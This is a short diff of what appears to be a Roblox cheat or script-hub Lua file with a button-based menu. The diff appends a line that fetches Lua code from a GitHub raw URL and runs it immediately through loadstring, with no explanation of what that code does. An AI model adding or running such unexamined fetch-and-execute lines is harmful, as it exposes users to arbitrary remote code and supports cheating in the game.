@@ -69,3 +69,6 @@ Tab1:Button({
 	loadstring(game:HttpGet(getgenv().Config[_G.Map].http))()
 	end
 })
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectSHub01/60fps/refs/heads/main/What%20the%20fuck.lua"))()
